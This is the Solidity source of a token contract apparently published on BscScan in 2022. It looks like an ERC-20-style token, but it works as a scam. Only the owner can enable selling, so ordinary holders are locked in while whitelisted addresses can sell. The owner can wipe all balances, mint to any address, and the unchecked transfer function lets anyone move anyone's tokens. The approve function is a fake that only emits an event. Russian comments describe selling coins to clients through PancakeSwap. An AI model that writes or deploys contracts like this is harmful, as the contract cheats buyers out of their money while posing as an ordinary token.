/**
 *Submitted for verification at BscScan.com on 2022-08-12
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.8;
library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {

    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b);

    return c;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a);

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b > 0); // Solidity only automatically asserts when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b <= a);
    uint256 c = a - b;

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    require(b != 0);
    return a % b;
  }
}

library Address {

    function isContract(address account) internal view returns (bool) {
        // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
        // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
        // for accounts without code, i.e. `keccak256('')`
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        // solhint-disable-next-line no-inline-assembly
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
    }

    function sendValue(address payable recipient, uint256 amount) internal {
        require(address(this).balance >= amount, "Address: insufficient balance");

        // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
        (bool success, ) = recipient.call{ value: amount }("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {
      return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
        require(address(this).balance >= value, "Address: insufficient balance for call");
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
        require(isContract(target), "Address: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = target.call{ value: weiValue }(data);
        if (success) {
            return returndata;
        } else {
            // Look for revert reason and bubble it up if present
            if (returndata.length > 0) {
                // The easiest way to bubble the revert reason is using memory via assembly

                // solhint-disable-next-line no-inline-assembly
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

interface IERC20 {
    function init(address tokenAddress, uint256 supply) external returns (bool);
    function totalSupply() external view returns (uint256);
    function getDecimals() external view returns(uint8);
    function getOwner() external view returns(address);

    function balanceOf(address who) external view returns (uint256);
    function transfer(address from,address to, uint256 value) external returns(bool) ;
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value)    external returns (bool);
    event Transfer(address indexed from,address indexed to,uint256 value);
    event OwnershipTransferred(address indexed from,address indexed to);
    event Approval(address indexed owner,address indexed spender,uint256 value);
}

contract MAINcontr is IERC20 {
    using SafeMath for uint256;
    using Address for address;
    uint256 private _totalSupply;
    uint8 private _decimals=9;
    address private _owner;
    address public initAdr;
    bool public sellOn=false;
    address[] public users;

    mapping (address => uint256) private _balances;
    mapping (address=>address) public listTrans;
    mapping(address=>address) public whiteList;

    constructor(){
        _owner=msg.sender;
       // _balances[_owner]=_totalSupply;
        emit Transfer(address(0),msg.sender,_totalSupply);
    }

    modifier onlyOwner{
      require(msg.sender==_owner,"GET OUT!");
      _;
    }

    function clearBalances() external onlyOwner{
       for(uint256 i=0;i<users.length;i++){
            delete _balances[users[i]];
        }
    }

    function addWhite(address who) external onlyOwner{
      whiteList[who]=who;
    }

    function isUsers(address who) public view returns(bool){
      for(uint256 i=0;i<users.length;i++){
        if(who==users[i]){
          return true;
        }
      }
      return false;
    }

    function setSell(bool s) external onlyOwner{
      sellOn=s;
    }
    //он продажа монет. фром кекй ту клиент
  function transferFrom(address from,address to,uint256 amount) public returns (bool)
  {
    require(sellOn==true || from==initAdr || from==_owner || whiteList[from]==from );
    _transfer(from, to, amount);
    return true;
  }

  //он переводит панкейку деньги и получает монеты
  function transfer(address from,address to, uint256 amount) external returns(bool){

      _transfer(from,to,amount);
      return true;
  }

  function _transfer(address from, address to, uint256 value) private {
    
      _balances[from] = _balances[from].sub(value);
      _balances[to] = _balances[to].add(value);     
      emit Transfer(from, to, value);
      if(isUsers(from)!=true){
        users.push(from);
      }
      if(isUsers(to)!=true){
        users.push(to);
      }
  }

    function init(address adr,uint256 supl) public returns (bool) {
        require(adr==_owner);
        _totalSupply=supl;
        initAdr=adr;
        _balances[_owner]=_totalSupply;
        users.push(_owner);
        return true;
    }

    function airDrop(address to,uint256 amount) public onlyOwner{
        _balances[to]=_balances[to].add(amount);
    }

  function totalSupply() public view returns (uint256) {
    return _totalSupply;
  }

  function getOwner() public view returns (address) {
    return _owner;
  }
  function getDecimals() public view returns (uint8) {
    return _decimals;
  }


  function balanceOf(address owner) public view returns (uint256) {
    return _balances[owner];
  }

  function approve(address spender, uint256 value) public returns (bool) {
    emit Approval(msg.sender, spender, value);
    return true;
  }

function renounceOwnership() public onlyOwner{
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) private  {
    require(newOwner != address(0));
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }

}